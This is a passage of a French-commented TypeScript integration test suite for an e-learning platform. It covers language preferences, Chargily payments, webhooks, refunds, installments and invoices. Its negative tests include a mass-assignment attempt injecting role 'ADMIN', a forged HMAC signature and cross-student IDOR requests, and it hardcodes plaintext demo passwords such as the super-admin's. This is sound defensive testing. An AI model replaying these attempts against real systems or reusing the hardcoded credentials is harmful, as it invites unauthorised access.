      badLangPref.status === 400 && badLangPref.body.error === 'VALIDATION_ERROR',
      'PATCH /api/auth/preferences doit rejeter toute langue hors fr|ar avec 400 VALIDATION_ERROR'
    );

    const extraPropPref = await apiCall(
      '/auth/preferences',
      {
        method: 'PATCH',
        body: JSON.stringify({ preferredLanguage: 'ar', role: 'ADMIN' }),
      },
      yacineJar
    );
    assert(
      extraPropPref.status === 400 && extraPropPref.body.error === 'VALIDATION_ERROR',
      'PATCH /api/auth/preferences (.strict()) doit rejeter tout champ parasite (mass-assignment)'
    );

    // c) Sauvegarde de l'arabe ('ar') pour Student 1 (Yacine) et vérification d'isolation par utilisateur
    const setArRes = await apiCall(
      '/auth/preferences',
      {
        method: 'PATCH',
        body: JSON.stringify({ preferredLanguage: 'ar' }),
      },
      yacineJar
    );
    assert(
      setArRes.status === 200 &&
        setArRes.body.preferredLanguage === 'ar' &&
        setArRes.body.user?.preferredLanguage === 'ar',
      'PATCH /api/auth/preferences doit sauvegarder preferredLanguage="ar" pour Student 1'
    );

    // Student 2 conserve sa propre langue ('fr') sans être affecté par Student 1
    const stu2Me = await apiCall('/auth/me', {}, stu2Jar);
    assert(
      stu2Me.status === 200 && stu2Me.body.user?.preferredLanguage === 'fr',
      'La préférence de langue est strictement isolée par utilisateur (Student 2 reste en fr)'
    );

    // Déconnexion puis reconnexion de Student 1 : la langue 'ar' est bien restituée par PostgreSQL
    await apiCall('/auth/logout', { method: 'POST' }, yacineJar);
    const { res: reloginYacineRes, jar: reloginYacineJar } = await loginAs(
      'yacine.brahimi@etu.najahlearn.dz',
      'Student2026!',
      'STUDENT',
      '10.99.88.11'
    );
    assert(
      reloginYacineRes.status === 200 && reloginYacineRes.body.user?.preferredLanguage === 'ar',
      'Après reconnexion, /api/auth/login doit restituer preferredLanguage="ar" depuis PostgreSQL'
    );
    const reloginMe = await apiCall('/auth/me', {}, reloginYacineJar);
    assert(
      reloginMe.status === 200 && reloginMe.body.user?.preferredLanguage === 'ar',
      'GET /api/auth/me doit restituer preferredLanguage="ar" pour l utilisateur connecté'
    );

    // Remise en 'fr' de Student 1 pour laisser les données de démonstration dans leur état initial
    const restoreFrRes = await apiCall(
      '/auth/preferences',
      {
        method: 'PATCH',
        body: JSON.stringify({ preferredLanguage: 'fr' }),
      },
      reloginYacineJar
    );
    assert(restoreFrRes.status === 200 && restoreFrRes.body.preferredLanguage === 'fr', 'Restauration preferredLanguage="fr" réussie');

    // d) SUPER_ADMIN en mode inspection d'un établissement (X-Tenant-Id: tnt_atlas_oran) peut aussi mémoriser sa langue
    const { res: saLoginRes, jar: saJar } = await loginAs(
      'superadmin@najahlearn.dz',
      'SuperAdmin2026!',
      'SUPER_ADMIN',
      '10.99.88.12'
    );
    assert(saLoginRes.status === 200, 'Connexion SUPER_ADMIN réussie');
    const saSetAr = await apiCall(
      '/auth/preferences',
      {
        method: 'PATCH',
        headers: { 'X-Tenant-Id': 'tnt_atlas_oran' },
        body: JSON.stringify({ preferredLanguage: 'ar' }),
      },
      saJar
    );
    assert(
      saSetAr.status === 200 && saSetAr.body.user?.preferredLanguage === 'ar',
      'SUPER_ADMIN peut changer sa langue même pendant l inspection d un établissement (X-Tenant-Id)'
    );
    await apiCall(
      '/auth/preferences',
      {
        method: 'PATCH',
        body: JSON.stringify({ preferredLanguage: 'fr' }),
      },
      saJar
    );
    console.log(
      '  [PASS] Persistance langue par utilisateur : PostgreSQL (users.preferred_language), isolation inter-comptes, Zod .strict(), CSRF et SUPER_ADMIN validés'
    );

    // -------------------------------------------------------------------------
    // SECTION 5 : CHARGILY PAY V2 (CIB/EDAHABIA), WEBHOOKS HMAC-SHA256,
    //             ÉCHECS/DOUBLONS/REMBOURSEMENTS, ÉCHÉANCIERS, RELANCES AUTO
    //             & FACTURES PDF NUMÉROTÉES SÉQUENTIELLEMENT (NIF/NIS/RC/TVA)
    // -------------------------------------------------------------------------
    console.log('\n===================================================================');
    console.log('5. CHARGILY PAY V2, WEBHOOKS HMAC, ÉCHÉANCIERS, RELANCES & FACTURES PDF');
    console.log('===================================================================');

    // 5.1 Création d'un étudiant dédié au test de facturation + Conservation CCP/BaridiMob manuel
    const billingStuId = `usr_stu_bill_${crypto.randomUUID()}`;
    const billingStuEmail = `billing.qa.${Date.now()}@etu.najahlearn.dz`;
    const billingStuPwdHash = await hashPassword('StudentBilling2026!');
    const nowBillIso = new Date().toISOString();

    await db.insert(users).values({
      id: billingStuId,
      tenantId: 'tnt_najahlearn',
      uid: billingStuId,
      name: 'Rayan Meziane QA',
      email: billingStuEmail,
      role: 'STUDENT',
      status: 'ACTIVE',
      phone: '+213 551 77 66 55',
      preferredLanguage: 'fr',
      passwordHash: billingStuPwdHash,
      createdAt: nowBillIso,
      updatedAt: nowBillIso,
    });
    await db.insert(studentProfiles).values({
      id: `prf_bill_${crypto.randomUUID()}`,
      tenantId: 'tnt_najahlearn',
      userId: billingStuId,
      studentIdNumber: `ETU-QA-${Date.now().toString().slice(-4)}`,
      city: 'Alger',
      wilaya: '16 - Alger',
      academicLevel: 'Master 2 Informatique',
      currentClassId: 'cls_web_1',
    });
    cleanupUserIds.push(billingStuId);

    const { res: billStuLoginRes, jar: billStuJar } = await loginAs(
      billingStuEmail,
      'StudentBilling2026!',
      'STUDENT',
      '10.99.90.10'
    );
    assert(billStuLoginRes.status === 200, 'Connexion étudiant QA facturation réussie');

    // Paiement manuel CCP / BaridiMob préservé -> confirmation Admin -> abonnement + facture séquentielle
    const manualCcpRes = await apiCall(
      '/payments',
      {
        method: 'POST',
        body: JSON.stringify({
          courseId: 'crs_web',
          amountDzd: 36000,
          paymentMethod: 'BARIDIMOB_CCP',
          transactionReference: `CCP-MANUAL-${Date.now()}`,
        }),
      },
      billStuJar
    );
    assert(
      manualCcpRes.status === 201 &&
        manualCcpRes.body.payment.status === 'PENDING' &&
        manualCcpRes.body.payment.paymentMethod === 'BARIDIMOB_CCP',
      'Paiement manuel CCP/BaridiMob créé en statut PENDING (201)'
    );
    const manualCcpPaymentId = manualCcpRes.body.payment.id as string;
    cleanupPaymentIds.push(manualCcpPaymentId);

    const confirmManualCcpRes = await apiCall(
      `/payments/${manualCcpPaymentId}/confirm`,
      {
        method: 'POST',
        body: JSON.stringify({ administrativeNotes: 'Virement BaridiMob vérifié par scolarité' }),
      },
      adminJar
    );
    assert(
      confirmManualCcpRes.status === 200 &&
        confirmManualCcpRes.body.payment.status === 'CONFIRMED' &&
        Boolean(confirmManualCcpRes.body.payment.subscriptionId),
      'Confirmation manuelle CCP/BaridiMob active l abonnement et émet une facture'
    );
    cleanupSubscriptionIds.push(confirmManualCcpRes.body.payment.subscriptionId);

    const manualPaymentDetail = await apiCall(`/payments/${manualCcpPaymentId}`, {}, billStuJar);
    assert(
      manualPaymentDetail.status === 200 &&
        /^FAC-NL-\d{4}-\d{5}$/.test(manualPaymentDetail.body.payment.invoiceNumber || ''),
      'Le paiement manuel CCP/BaridiMob confirmé est lié à une facture séquentielle FAC-NL-YYYY-NNNNN'
    );
    const firstNlInvoiceId = manualPaymentDetail.body.payment.invoiceId as string;
    console.log(
      `  [PASS] Conservation CCP/BaridiMob manuel + facture séquentielle (${manualPaymentDetail.body.payment.invoiceNumber})`
    );

    // 5.2 Création de session Chargily Pay V2 (Edahabia) + Idempotence anti-doublon + Validation Zod
    const badChargilyCard = await apiCall(
      '/payments/chargily/checkout',
      {
        method: 'POST',
        body: JSON.stringify({
          courseId: 'crs_data',
          cardMethod: 'amex',
        }),
      },
      billStuJar
    );
    assert(
      badChargilyCard.status === 400 && badChargilyCard.body.error === 'VALIDATION_ERROR',
      'Zod rejette toute carte hors edahabia|cib sur POST /api/payments/chargily/checkout (400)'
    );

    const idemKeyEdahabia = `idem_edahabia_${crypto.randomUUID()}`;
    const createCheckout1 = await apiCall(
      '/payments/chargily/checkout',
      {
        method: 'POST',
        body: JSON.stringify({
          courseId: 'crs_data',
          cardMethod: 'edahabia',
          idempotencyKey: idemKeyEdahabia,
          locale: 'fr',
        }),
      },
      billStuJar
    );
    assert(
      createCheckout1.status === 201 &&
        createCheckout1.body.reusedIdempotent === false &&
        createCheckout1.body.checkout.cardMethod === 'edahabia' &&
        createCheckout1.body.checkout.status === 'PENDING' &&
        createCheckout1.body.payment.paymentMethod === 'CHARGILY_EDAHABIA' &&
        createCheckout1.body.payment.status === 'PENDING' &&
        createCheckout1.body.payment.amountDzd === 42000,
      'Session Chargily Pay V2 Edahabia créée en statut PENDING (201)'
    );
    const edahabiaCheckoutId = createCheckout1.body.checkout.id as string;
    const edahabiaPaymentId = createCheckout1.body.payment.id as string;
    cleanupCheckoutIds.push(edahabiaCheckoutId);
    cleanupPaymentIds.push(edahabiaPaymentId);

    // Rejeu avec la même clé d'idempotence -> 200 reusedIdempotent: true (aucun doublon créé)
    const createCheckout1Dup = await apiCall(
      '/payments/chargily/checkout',
      {
        method: 'POST',
        body: JSON.stringify({
          courseId: 'crs_data',
          cardMethod: 'edahabia',
          idempotencyKey: idemKeyEdahabia,
          locale: 'fr',
        }),
      },
      billStuJar
    );
    assert(
      createCheckout1Dup.status === 200 &&
        createCheckout1Dup.body.reusedIdempotent === true &&
        createCheckout1Dup.body.checkout.id === edahabiaCheckoutId &&
        createCheckout1Dup.body.payment.id === edahabiaPaymentId,
      'Clé d idempotence Chargily : un double clic retourne la même session sans créer de doublon (200)'
    );
    console.log(
      '  [PASS] Chargily Pay V2 Checkout (Edahabia) + Clé d idempotence anti-doublon validés'
    );

    // 5.3 Webhook Chargily Pay V2 : Vérification HMAC-SHA256, Activation Abonnement & Idempotence Événements
    const webhookEvtPaidId = `evt_paid_${crypto.randomUUID().replace(/-/g, '').slice(0, 18)}`;
    cleanupWebhookEventIds.push(webhookEvtPaidId);

    const paidWebhookPayloadObj = {
      id: webhookEvtPaidId,
      entity: 'event',
      livemode: false,
      type: 'checkout.paid',
      data: {
        id: edahabiaCheckoutId,
        entity: 'checkout',
        amount: 42000,
        currency: 'dzd',
        payment_method: 'edahabia',
        status: 'paid',
        metadata: {
          tenantId: 'tnt_najahlearn',
          paymentId: edahabiaPaymentId,
          studentId: billingStuId,
          courseId: 'crs_data',
        },
      },
    };
    const paidWebhookRaw = JSON.stringify(paidWebhookPayloadObj);

    // a) Webhook sans signature -> 401
    const whMissingSig = await fetch(`${baseUrl}/webhooks/chargily/najahlearn-alger`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: paidWebhookRaw,
    });
    assert(whMissingSig.status === 401, 'Webhook Chargily sans en-tête signature rejeté (401)');

    // b) Webhook avec signature HMAC falsifiée -> 401 + paiement reste PENDING
    const whBadSig = await fetch(`${baseUrl}/webhooks/chargily/najahlearn-alger`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        signature: 'b'.repeat(64),
      },
      body: paidWebhookRaw,
    });
    assert(whBadSig.status === 401, 'Webhook Chargily avec signature HMAC falsifiée rejeté (401)');

    const checkStillPending = await apiCall(`/payments/${edahabiaPaymentId}`, {}, billStuJar);
    assert(
      checkStillPending.status === 200 && checkStillPending.body.payment.status === 'PENDING',
      'Après tentative de webhook falsifié, le paiement demeure strictement PENDING'
    );

    // c) Webhook avec signature HMAC-SHA256 authentique -> 200 + paiement CONFIRMED + abonnement ACTIVE + facture émise
    const chargilyCfg = await getChargilyResolvedConfig('tnt_najahlearn');
    const validHmacSig = computeChargilySignature(paidWebhookRaw, chargilyCfg.webhookSecret);

    const whValidRes = await fetch(`${baseUrl}/webhooks/chargily/najahlearn-alger`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        signature: validHmacSig,
      },
      body: paidWebhookRaw,
    });
    const whValidBody = await whValidRes.json();
    assert(
      whValidRes.status === 200 &&
        whValidBody.received === true &&
        whValidBody.duplicate === false &&
        whValidBody.payment?.status === 'CONFIRMED',
      'Webhook Chargily checkout.paid signé HMAC-SHA256 accepté et traité (200)'
    );

    const confirmedEdahabiaRes = await apiCall(`/payments/${edahabiaPaymentId}`, {}, billStuJar);
    assert(
      confirmedEdahabiaRes.status === 200 &&
        confirmedEdahabiaRes.body.payment.status === 'CONFIRMED' &&
        Boolean(confirmedEdahabiaRes.body.payment.subscriptionId) &&
        /^FAC-NL-\d{4}-\d{5}$/.test(confirmedEdahabiaRes.body.payment.invoiceNumber || ''),
      'Webhook checkout.paid confirme le paiement, active l abonnement et génère la facture séquentielle'
    );
    const edahabiaSubId = confirmedEdahabiaRes.body.payment.subscriptionId as string;
    const secondNlInvoiceId = confirmedEdahabiaRes.body.payment.invoiceId as string;
    cleanupSubscriptionIds.push(edahabiaSubId);

    const activeSubsAfterWebhook = await apiCall('/subscriptions', {}, billStuJar);
    const dataSub = (activeSubsAfterWebhook.body.subscriptions || []).find(
      (s: any) => s.id === edahabiaSubId
    );
    assert(
      Boolean(dataSub) && dataSub.status === 'ACTIVE' && dataSub.courseId === 'crs_data',
      'L abonnement de l étudiant à crs_data est automatiquement ACTIVE dès réception du webhook'
    );

    // d) Rejeu exact du même événement webhook -> 200 duplicate: true (idempotent)
    const whReplaySameEvt = await fetch(`${baseUrl}/webhooks/chargily/najahlearn-alger`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        signature: validHmacSig,
      },
      body: paidWebhookRaw,
    });
    const whReplaySameBody = await whReplaySameEvt.json();
    assert(
      whReplaySameEvt.status === 200 && whReplaySameBody.duplicate === true,
      'Rejeu du même event.id Chargily détecté et ignoré de façon idempotente (duplicate: true)'
    );

    // e) Second event.id distinct tentant de re-confirmer le même checkout -> 200 duplicate: true
    const webhookEvtDup2Id = `evt_dup2_${crypto.randomUUID().replace(/-/g, '').slice(0, 18)}`;
    cleanupWebhookEventIds.push(webhookEvtDup2Id);
    const dup2Raw = JSON.stringify({ ...paidWebhookPayloadObj, id: webhookEvtDup2Id });
    const dup2Sig = computeChargilySignature(dup2Raw, chargilyCfg.webhookSecret);
    const whDup2Res = await fetch(`${baseUrl}/webhooks/chargily/najahlearn-alger`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        signature: dup2Sig,
      },
      body: dup2Raw,
    });
    const whDup2Body = await whDup2Res.json();
    assert(
      whDup2Res.status === 200 && whDup2Body.duplicate === true,
      'Double notification checkout.paid avec nouvel event.id neutralisée sans double abonnement ni double facture'
    );
    console.log(
      '  [PASS] Webhook Chargily HMAC-SHA256 : 401 sans/fausse signature, 200 activation auto & anti-doublon idempotent'
    );

    // 5.4 Gestion des échecs de paiement en ligne (CIB checkout.failed)
    const createCibCheckout = await apiCall(
      '/payments/chargily/checkout',
      {
        method: 'POST',
        body: JSON.stringify({
          courseId: 'crs_cyber',
          cardMethod: 'cib',
          locale: 'ar',
        }),
      },
      billStuJar
    );
    assert(
      createCibCheckout.status === 201 &&
        createCibCheckout.body.payment.paymentMethod === 'CHARGILY_CIB',
      'Session Chargily Pay V2 CIB créée (201)'
    );
    const cibCheckoutId = createCibCheckout.body.checkout.id as string;
    const cibPaymentId = createCibCheckout.body.payment.id as string;
    cleanupCheckoutIds.push(cibCheckoutId);
    cleanupPaymentIds.push(cibPaymentId);

    const webhookEvtFailId = `evt_fail_${crypto.randomUUID().replace(/-/g, '').slice(0, 18)}`;
    cleanupWebhookEventIds.push(webhookEvtFailId);
    const failedWebhookRaw = JSON.stringify({
      id: webhookEvtFailId,
      entity: 'event',
      livemode: false,
      type: 'checkout.failed',
      data: {
        id: cibCheckoutId,
        entity: 'checkout',
        amount: 48000,
        currency: 'dzd',
        payment_method: 'cib',
        status: 'failed',
        failure_reason: 'Plafond carte CIB dépassé / authentification 3DS refusée',
        metadata: {
          tenantId: 'tnt_najahlearn',
          paymentId: cibPaymentId,
          studentId: billingStuId,
          courseId: 'crs_cyber',
        },
      },
    });
    const failedSig = computeChargilySignature(failedWebhookRaw, chargilyCfg.webhookSecret);
    const whFailRes = await fetch(`${baseUrl}/webhooks/chargily/najahlearn-alger`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        signature: failedSig,
      },
      body: failedWebhookRaw,
    });
    assert(whFailRes.status === 200, 'Webhook checkout.failed traité (200)');

    const failedPaymentCheck = await apiCall(`/payments/${cibPaymentId}`, {}, billStuJar);
    assert(
      failedPaymentCheck.status === 200 &&
        failedPaymentCheck.body.payment.status === 'FAILED' &&
        (failedPaymentCheck.body.payment.failureReason || '').includes('CIB') &&
        !failedPaymentCheck.body.payment.subscriptionId &&
        !failedPaymentCheck.body.payment.invoiceId,
      'Un échec Chargily (checkout.failed) marque le paiement FAILED sans activer d abonnement ni émettre de facture'
    );
    console.log(
      '  [PASS] Gestion des échecs Chargily (CIB checkout.failed) : statut FAILED tracé, zéro activation indue'
    );

    // 5.5 Gestion des remboursements, avoir fiscal (AVO-...) & suspension automatique de l'abonnement
    // a) Impossible de rembourser un paiement FAILED -> 400 PAYMENT_NOT_CONFIRMED
    const refundFailedAttempt = await apiCall(
      `/payments/${cibPaymentId}/refund`,
      {
        method: 'POST',
        body: JSON.stringify({ reason: 'Tentative remboursement sur paiement échoué' }),
      },
      adminJar
    );
    assert(
      refundFailedAttempt.status === 400 &&
        refundFailedAttempt.body.error === 'PAYMENT_NOT_CONFIRMED',
      'Remboursement refusé (400) sur un paiement non confirmé'
    );

    // b) Remboursement intégral du paiement Edahabia confirmé -> paiement REFUNDED, facture REFUNDED + AVO-..., abonnement SUSPENDED
    const refundSuccessRes = await apiCall(
      `/payments/${edahabiaPaymentId}/refund`,
      {
        method: 'POST',
        body: JSON.stringify({
          reason: 'Rétractation étudiant dans le délai contractuel de 7 jours',
        }),
      },
      adminJar
    );
    assert(
      refundSuccessRes.status === 200 &&
        refundSuccessRes.body.payment.status === 'REFUNDED' &&
        refundSuccessRes.body.payment.refundedAmountDzd === 42000 &&
        refundSuccessRes.body.invoice?.status === 'REFUNDED' &&
        (refundSuccessRes.body.invoice?.creditNoteNumber || '').startsWith('AVO-'),
      'Remboursement intégral : paiement REFUNDED, avoir fiscal AVO-... émis sur la facture'
    );

    const subsAfterRefund = await apiCall('/subscriptions', {}, billStuJar);
    const refundedSub = (subsAfterRefund.body.subscriptions || []).find(
      (s: any) => s.id === edahabiaSubId
    );
    assert(
      Boolean(refundedSub) && refundedSub.status === 'SUSPENDED',
      'Après remboursement intégral, l abonnement associé passe automatiquement à SUSPENDED'
    );

    // c) Double remboursement bloqué -> 409 PAYMENT_ALREADY_REFUNDED
    const doubleRefundAttempt = await apiCall(
      `/payments/${edahabiaPaymentId}/refund`,
      {
        method: 'POST',
        body: JSON.stringify({ reason: 'Tentative double remboursement' }),
      },
      adminJar
    );
    assert(
      doubleRefundAttempt.status === 409 &&
        doubleRefundAttempt.body.error === 'PAYMENT_ALREADY_REFUNDED',
      'Double remboursement bloqué avec HTTP 409 PAYMENT_ALREADY_REFUNDED'
    );
    console.log(
      `  [PASS] Remboursement & Avoir fiscal (${refundSuccessRes.body.invoice.creditNoteNumber}) + suspension abonnement + anti-double remboursement (409)`
    );

    // 5.6 Échéanciers (paiement en plusieurs fois 3x) & Relances automatiques dédupliquées
    const createPlanRes = await apiCall(
      '/installments',
      {
        method: 'POST',
        body: JSON.stringify({
          studentId: billingStuId,
          courseId: 'crs_cyber',
          installmentsCount: 3,
          intervalDays: 30,
          notes: 'Échéancier 3x Cybersécurité',
        }),
      },
      adminJar
    );
    assert(
      createPlanRes.status === 201 &&
        createPlanRes.body.plan.installmentsCount === 3 &&
        createPlanRes.body.plan.items.length === 3 &&
        createPlanRes.body.plan.items.reduce((s: number, it: any) => s + it.amountDzd, 0) ===
          createPlanRes.body.plan.totalAmountDzd,
      'Échéancier 3x créé avec répartition exacte sans perte d arrondi DZD (201)'
    );
    const createdPlan = createPlanRes.body.plan;
    cleanupInstallmentPlanIds.push(createdPlan.id);
    const [tranche1, tranche2] = createdPlan.items;

    // Anti-IDOR : Student 2 ne peut pas lire les échéanciers de billingStuId
    const idorInstallments = await apiCall(
      `/installments?studentId=${encodeURIComponent(billingStuId)}`,
      {},
      stu2Jar
    );
    assert(
      idorInstallments.status === 403 &&
        idorInstallments.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'Anti-IDOR : un autre étudiant ne peut pas consulter les échéanciers d un tiers (403)'
    );

    // Paiement en ligne de la 1ère tranche via Chargily + simulation HMAC sandbox
    const tranche1CheckoutRes = await apiCall(
      '/payments/chargily/checkout',
      {
        method: 'POST',
        body: JSON.stringify({
          courseId: 'crs_cyber',
          cardMethod: 'cib',
          installmentItemId: tranche1.id,
        }),
      },
      billStuJar
    );
    assert(
      tranche1CheckoutRes.status === 201 &&
        tranche1CheckoutRes.body.payment.amountDzd === tranche1.amountDzd,
      'Checkout Chargily initialisé sur la 1ère échéance (montant exact de la tranche 1)'
    );
    const tranche1CheckoutId = tranche1CheckoutRes.body.checkout.id as string;
    const tranche1PaymentId = tranche1CheckoutRes.body.payment.id as string;
    cleanupCheckoutIds.push(tranche1CheckoutId);
    cleanupPaymentIds.push(tranche1PaymentId);

    // Anti-IDOR sur la simulation sandbox par Student 2
    const idorSandboxSim = await apiCall(
      `/payments/chargily/sandbox/${tranche1CheckoutId}/simulate`,
      {
        method: 'POST',
        body: JSON.stringify({ outcome: 'paid' }),
      },
      stu2Jar
    );
    assert(
      idorSandboxSim.status === 403 &&
        idorSandboxSim.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'Anti-IDOR : un tiers ne peut pas simuler le checkout Chargily d un autre étudiant (403)'
    );

    const simTranche1Paid = await apiCall(
      `/payments/chargily/sandbox/${tranche1CheckoutId}/simulate`,
      {
        method: 'POST',
        body: JSON.stringify({ outcome: 'paid' }),
      },
      billStuJar
    );
    assert(
      simTranche1Paid.status === 200 &&
        simTranche1Paid.body.received === true &&
        simTranche1Paid.body.duplicate === false,
      'Règlement de la 1ère tranche confirmé via webhook signé sandbox (200)'
    );

    const tranche1PayAfter = await apiCall(`/payments/${tranche1PaymentId}`, {}, billStuJar);
    if (tranche1PayAfter.body.payment?.subscriptionId) {
      cleanupSubscriptionIds.push(tranche1PayAfter.body.payment.subscriptionId);
    }

    const plansAfterTranche1 = await apiCall('/installments', {}, billStuJar);
    const updatedPlan = (plansAfterTranche1.body.plans || []).find(
      (p: any) => p.id === createdPlan.id
    );
    const updatedItem1 = updatedPlan?.items.find((i: any) => i.id === tranche1.id);
    assert(
      Boolean(updatedPlan) &&
        updatedPlan.paidAmountDzd === tranche1.amountDzd &&
        updatedItem1?.status === 'PAID',
      'La 1ère échéance passe à PAID et le montant cumulé payé de l échéancier est mis à jour'
    );

    // Simuler une 2ème échéance en retard (J-5) et exécuter le moteur de relances automatiques
    const fiveDaysAgoYmd = new Date(Date.now() - 5 * 86_400_000).toISOString().split('T')[0];
    await db
      .update(installmentItems)
      .set({ dueDate: fiveDaysAgoYmd, status: 'PENDING', lastReminderAt: null })
      .where(eq(installmentItems.id, tranche2.id));

    const runReminders1 = await apiCall(
      '/installments/run-reminders',
      {
        method: 'POST',
        body: JSON.stringify({}),
      },
      adminJar
    );
    assert(
      runReminders1.status === 200 &&
        runReminders1.body.markedOverdueCount >= 1 &&
        runReminders1.body.remindersSentCount >= 1,
      'Moteur de relances automatiques : bascule l échéance échue en OVERDUE et expédie la relance'
    );

    const stuRemindersRes = await apiCall('/installments/reminders', {}, billStuJar);
    const overdueReminder = (stuRemindersRes.body.reminders || []).find(
      (r: any) =>
        r.installmentItemId === tranche2.id &&
        (r.reminderType === 'OVERDUE_REMINDER' || r.reminderType === 'OVERDUE_FINAL')
    );
    assert(
      Boolean(overdueReminder) && overdueReminder.dueDate === fiveDaysAgoYmd,
      'Historique des relances : la relance OVERDUE_REMINDER est bien enregistrée pour l étudiant'
    );

    // Re-exécution immédiate le même jour : anti-spam (aucune relance en doublon pour tranche2)
    const beforeCountForTranche2 = (stuRemindersRes.body.reminders || []).filter(
      (r: any) => r.installmentItemId === tranche2.id
    ).length;
    const runReminders2 = await apiCall(
      '/installments/run-reminders',
      {
        method: 'POST',
        body: JSON.stringify({}),
      },
      adminJar
    );
    assert(runReminders2.status === 200, 'Second appel POST /api/installments/run-reminders (200)');
    const stuRemindersAfter2 = await apiCall('/installments/reminders', {}, billStuJar);
    const afterCountForTranche2 = (stuRemindersAfter2.body.reminders || []).filter(
      (r: any) => r.installmentItemId === tranche2.id
    ).length;
    assert(
      afterCountForTranche2 === beforeCountForTranche2,
      'Anti-spam relances : aucune relance dupliquée n est envoyée lors d une ré-exécution le même jour'
    );
    console.log(
      '  [PASS] Échéanciers 3x + Paiement par tranche + Relances automatiques (OVERDUE & déduplication anti-spam)'
    );

    // 5.7 Factures PDF numérotées séquentiellement, NIF/NIS/RC/TVA par établissement & Anti-IDOR
    const inv1Res = await apiCall(`/invoices/${firstNlInvoiceId}`, {}, billStuJar);
    const inv2Res = await apiCall(`/invoices/${secondNlInvoiceId}`, {}, billStuJar);
    assert(
      inv1Res.status === 200 &&
        inv2Res.status === 200 &&
        inv2Res.body.invoice.sequenceNumber === inv1Res.body.invoice.sequenceNumber + 1 &&
        inv1Res.body.invoice.tvaRatePercent === 0 &&
        inv1Res.body.invoice.amountHtDzd === 36000 &&
        inv1Res.body.invoice.tvaAmountDzd === 0 &&
        inv1Res.body.invoice.amountTtcDzd === 36000 &&
        Boolean(inv1Res.body.invoice.sellerSnapshot?.nif) &&
        Boolean(inv1Res.body.invoice.sellerSnapshot?.nis) &&
        Boolean(inv1Res.body.invoice.sellerSnapshot?.rc),
      'Numérotation strictement séquentielle sans trou sur NajahLearn (seq+1) + mentions fiscales NIF/NIS/RC et TVA 0%'
    );

    // Téléchargement binaire PDF (%PDF-1.7) par l'étudiant propriétaire
    const pdfDownloadRes = await fetch(`${baseUrl}/invoices/${firstNlInvoiceId}/pdf`, {
      headers: { Cookie: billStuJar.cookieHeader },
    });
    const pdfBytes = Buffer.from(await pdfDownloadRes.arrayBuffer());
    assert(
      pdfDownloadRes.status === 200 &&
        pdfDownloadRes.headers.get('content-type') === 'application/pdf' &&
        pdfDownloadRes.headers.get('x-content-type-options') === 'nosniff' &&
        pdfBytes.length > 1500 &&
        pdfBytes.subarray(0, 8).toString('latin1').startsWith('%PDF-1.7'),
      'GET /api/invoices/:id/pdf génère un authentique document binaire %PDF-1.7 téléchargeable'
    );

    // Téléchargement PDF d'une facture remboursée (avec bandeau d'avoir AVO-...)
    const refundedPdfRes = await fetch(`${baseUrl}/invoices/${secondNlInvoiceId}/pdf`, {
      headers: { Cookie: billStuJar.cookieHeader },
    });
    const refundedPdfBytes = Buffer.from(await refundedPdfRes.arrayBuffer());
    assert(
      refundedPdfRes.status === 200 &&
        refundedPdfBytes.subarray(0, 8).toString('latin1').startsWith('%PDF-1.7'),
      'GET /api/invoices/:id/pdf génère également le PDF rectificatif avec référence d avoir AVO-...'
    );

    // Anti-IDOR : Student 2 tente d'accéder à la facture JSON et au PDF d'un autre étudiant -> 403
    const idorInvJson = await apiCall(`/invoices/${firstNlInvoiceId}`, {}, stu2Jar);
    const idorInvPdf = await apiCall(`/invoices/${firstNlInvoiceId}/pdf`, {}, stu2Jar);
    assert(
      idorInvJson.status === 403 &&
        idorInvJson.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN' &&
        idorInvPdf.status === 403 &&
        idorInvPdf.body.error === 'RESOURCE_OWNERSHIP_FORBIDDEN',
      'Anti-IDOR Factures : un étudiant tiers est bloqué (403) sur GET /invoices/:id et GET /invoices/:id/pdf'
    );

    // Multi-Tenant : Institut Polytechnique Atlas Oran (TVA 19%, préfixe FAC-ATL, NIF/NIS/RC/AI propres)
    const { res: atlasAdmLogin, jar: atlasAdmJar } = await loginAs(
      'admin@atlas-oran.dz',
      'Admin2026!',
      'ADMIN',
      '10.99.90.31'
    );
    assert(atlasAdmLogin.status === 200, 'Connexion Admin Atlas Oran réussie');

    const updateAtlasFiscalRes = await apiCall(
      '/tenant/settings',
      {
        method: 'PUT',
        body: JSON.stringify({
          nif: '002631099887766',
          nis: '099831010044321',
          rc: '31/00-0998877B26',
          articleImposition: '31019988776',
          tvaApplicable: true,
          tvaRatePercent: 19,
          invoicePrefix: 'FAC-ATL',
        }),
      },
      atlasAdmJar
    );
    assert(
      updateAtlasFiscalRes.status === 200 &&
        updateAtlasFiscalRes.body.tenant?.nif === '002631099887766' &&
        updateAtlasFiscalRes.body.tenant?.tvaApplicable === true &&
        updateAtlasFiscalRes.body.tenant?.tvaRatePercent === 19,
      'Configuration fiscale par établissement (NIF, NIS, RC, AI, TVA 19%, FAC-ATL) enregistrée sur Atlas Oran'
    );

    // Paiement TTC de 11 900 DZD sur Atlas Oran -> HT = 10 000 DZD, TVA (19%) = 1 900 DZD, TTC = 11 900 DZD
    const atlasPayRes = await apiCall(
      '/payments',
      {
        method: 'POST',
        body: JSON.stringify({
          studentId: 'usr_atlas_stu_2',
          courseId: 'crs_atlas_emb',
          amountDzd: 11900,
          paymentMethod: 'BANK_TRANSFER',
          transactionReference: `VIR-ORAN-TVA19-${Date.now()}`,
        }),
      },
      atlasAdmJar
    );
    assert(
      atlasPayRes.status === 201 && atlasPayRes.body.payment.status === 'CONFIRMED',
      'Paiement enregistré et confirmé par Admin Atlas Oran (201)'
    );
    const atlasPayId = atlasPayRes.body.payment.id as string;
    cleanupPaymentIds.push(atlasPayId);
    if (atlasPayRes.body.payment.subscriptionId) {
      cleanupSubscriptionIds.push(atlasPayRes.body.payment.subscriptionId);
    }

    const atlasPayDetail = await apiCall(`/payments/${atlasPayId}`, {}, atlasAdmJar);
    const atlasInvoiceId = atlasPayDetail.body.payment.invoiceId as string;
    assert(Boolean(atlasInvoiceId), 'Facture séquentielle émise pour Atlas Oran');

